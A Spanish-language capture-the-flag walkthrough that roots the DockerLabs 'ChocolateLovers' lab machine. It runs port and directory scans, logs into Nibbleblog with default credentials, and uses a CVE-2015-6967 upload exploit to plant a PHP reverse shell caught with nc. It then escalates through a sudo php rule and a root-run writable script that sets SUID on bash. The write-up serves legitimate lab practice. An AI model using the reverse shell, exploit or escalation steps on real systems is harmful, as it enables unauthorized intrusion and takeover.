---
icon: flag
---

# ChocolateLovers DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip chocolatelovers.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh chocolatelovers.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 11:45 EST
Nmap scan report for 172.17.0.2
Host is up (0.000059s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

Vemos una pagina normal y corriente, pero si inspeccionamos la pagina veremos lo siguiente en el codigo:

```html
<!-- /nibbleblog -->
<!-- /nibbleblog -->
<!-- /nibbleblog -->
<!-- /nibbleblog -->
<!-- /nibbleblog -->
<!-- /nibbleblog -->
<!-- /nibbleblog -->
```

Vemos lo que parece ser un directorio, por lo que entraremos a el.

```
URL = http://<IP>/nibbleblog
```

Veremos un `Software`, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/nibbleblog -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/nibbleblog/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/LICENSE.txt          (Status: 200) [Size: 35148]
/README               (Status: 200) [Size: 4628]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/admin                (Status: 200) [Size: 2126]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 200) [Size: 1352]
/feed.php             (Status: 200) [Size: 1289]
/index.php            (Status: 200) [Size: 5015]
/install.php          (Status: 200) [Size: 78]
/languages            (Status: 200) [Size: 3166]
/plugins              (Status: 200) [Size: 3776]
/sitemap.php          (Status: 200) [Size: 541]
/themes               (Status: 200) [Size: 1740]
/update.php           (Status: 200) [Size: 1792]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, entre ellas un `/admin.php` que si entramos dentro veremos un panel de login, vamos a probar a meter credenciales por defecto:

```
User: admin
Pass: admin
```

Veremos que si funciona con las credenciales por defecto, por lo que vamos a ver si este `software` tuviera alguna vulnerabilidad.

Vemos que si tiene una vulnerabilidad asociada al `CVE-2015-6967` que es para subir archivos de forma arbitraria.

URL = [Exploit CVE-2015-6967 GitHub](https://github.com/dix0nym/CVE-2015-6967)

Vemos que en la pagina oficial de `Exploit D.B.` vemos la siguiente linea de codigo:

URL = [Exploit D.B. Info](https://www.exploit-db.com/exploits/38489)

```rb
if res && /Call to a member function getChild\(\) on a non\-object/ === res.body
      fail_with(Failure::Unknown, 'Unable to upload payload. Does the server have the My Image plugin installed?')
    elsif res && !( res.body.include?('<b>Warning</b>') || res.body.include?('warn') )
      fail_with(Failure::Unknown, 'Unable to upload payload.')
    end
```

Vemos que nos pone:

```
Unable to upload payload. Does the server have the My Image plugin installed?
```

Por lo que vemos parece ser que la pagina tiene que tener instalado el siguiente `plugin` por lo que nosotros lo instalaremos desde el panel de administrador de la siguiente forma.

## Escalate user www-data

En `Plugins` vemos la siguiente seccion:

<figure><img src="../../.gitbook/assets/image (181) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que le daremos a instalar y le daremos a `Guardar Cambios` una vez echo esto ejecutaremos el exploit de `GitHub` de la siguiente forma:

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

```shell
python3 exploit.py --url http://<IP>/nibbleblog/ --username admin --password admin --payload shell.php
```

Info:

```
[+] Login Successful.
[+] Upload likely successfull.
[+] Exploit launched, check for shell.
```

Vemos que se subio corerctamente, ahora veremos donde se encuentra el contenido del `plugin` donde se aloja dicho archivo.

Si inspeccionamos el codigo para ver donde lo escribe, veremos que lo guarda aqui:

```
exploitURL = f"{nibbleURL}content/private/plugins/my_image/image.php"
```

Por lo que nos iremos a la siguiente `URL`, pero antes nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Y ahora nos iremos a la siguiente ruta:

```
URL = http://<IP>/nibbleblog/content/private/plugins/my_image/image.php
```

Y si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 34952
whoami
www-data
```

Veremos que tendremos una `shell` como el usuario `www-data`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user chocolate

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 47ba4eca2fbc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 47ba4eca2fbc:
    (chocolate) NOPASSWD: /usr/bin/php
```

Vemos que podemos ejecutar el binario `php` como el usuario `chocolate`, por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
sudo -u chocolate php -r "system('$CMD');"
```

Y con esto veremos que seremos dicho usuario.

## Escalate Privileges

Si listamos los procesos de la maquina veremos lo siguiente:

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616  1588 ?        Ss   16:45   0:00 /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done
root          25  0.0  0.5 201396 22876 ?        Ss   16:45   0:00 /usr/sbin/apache2 -k start
www-data     230  0.0  0.4 201876 18260 ?        S    16:50   0:01 /usr/sbin/apache2 -k start
www-data     270  0.0  0.4 201920 18996 ?        S    16:50   0:01 /usr/sbin/apache2 -k start
www-data     347  0.0  0.4 202040 18064 ?        S    16:52   0:00 /usr/sbin/apache2 -k start
www-data     352  0.0  0.4 202020 18024 ?        S    16:52   0:00 /usr/sbin/apache2 -k start
www-data     353  0.0  0.4 202036 18500 ?        S    16:52   0:00 /usr/sbin/apache2 -k start
www-data     356  0.0  0.4 201868 17936 ?        S    16:52   0:00 /usr/sbin/apache2 -k start
www-data     368  0.0  0.4 202020 18084 ?        S    16:52   0:00 /usr/sbin/apache2 -k start
www-data     375  0.0  0.4 202044 18432 ?        S    16:52   0:00 /usr/sbin/apache2 -k start
www-data     411  0.0  0.4 202316 19132 ?        S    16:53   0:00 /usr/sbin/apache2 -k start
www-data     441  0.0  0.4 201880 18184 ?        S    16:53   0:00 /usr/sbin/apache2 -k start
www-data     826  0.0  0.0   2616  1548 ?        S    17:09   0:00 sh -c sh
www-data     827  0.0  0.0   2616  1588 ?        S    17:09   0:00 sh
www-data    1003  0.0  0.0   2644  2072 ?        S    17:16   0:00 script /dev/null -c bash
www-data    1004  0.0  0.0   2616  1500 pts/0    Ss   17:16   0:00 sh -c bash
www-data    1005  0.0  0.0   4244  3356 pts/0    S    17:16   0:00 bash
root        1068  0.0  0.0   5012  3492 pts/0    S    17:18   0:00 sudo -u chocolate php -r system('/bin/bash');
chocola+    1069  0.0  0.4  67024 18380 pts/0    S    17:18   0:00 php -r system('/bin/bash');
chocola+    1070  0.0  0.0   2616  1580 pts/0    S    17:18   0:00 sh -c /bin/bash
chocola+    1071  0.0  0.0   4248  3328 pts/0    S    17:18   0:00 /bin/bash
root        1104  0.0  0.0   2516  1344 ?        S    17:19   0:00 sleep 5
chocola+    1105  0.0  0.0   5900  2756 pts/0    R+   17:19   0:00 ps -aux
```

Vemos la siguiente linea bastante interesante:

```
/bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done
```

Por lo que vemos `root` esta ejecutando de forma continua con `5` segundos de descanso el `script` que esta en `/opt` el cual podremos modificar, por lo que haremos lo siguiente:

```shell
echo '<?php echo shell_exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

Esperamos unos `5` segundos y si listamos la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Vemos que ha funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Y con esto ya seremos `root` por lo que habremos terminado la maquina.
